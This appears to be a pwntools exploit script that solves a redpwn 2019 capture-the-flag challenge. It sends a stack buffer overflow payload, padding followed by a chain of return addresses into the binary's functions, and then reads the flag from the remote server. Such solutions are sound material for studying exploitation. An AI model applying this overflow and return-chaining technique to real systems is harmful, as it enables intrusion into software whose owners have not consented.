from pwn import *

r = remote('chall.2019.redpwn.net', 4005)

ret = 0x08049569
plt = 0x804bfc3
air = 0x08049216
water = 0x0804926d
land = 0x080492c4
underground = 0x0804931b
limbo = 0x08049372
hell = 0x080493c9
minecraft = 0x08049420
bedrock = 0x08049477
i_got_u = 0x80a0101
main = 0x80494f6

exploit = ''
exploit += 'AAAABBBBCCCCDDDDEEEEFF'
exploit += p32(air)
exploit += p32(water)
exploit += p32(land)
exploit += p32(underground)
exploit += p32(limbo)
exploit += p32(hell)
exploit += p32(minecraft)
exploit += p32(bedrock)
exploit += p32(main)

r.recvuntil('?')
r.sendline(exploit)
r.recvuntil('?')
r.sendline('pwned')
print r.recvuntil('}')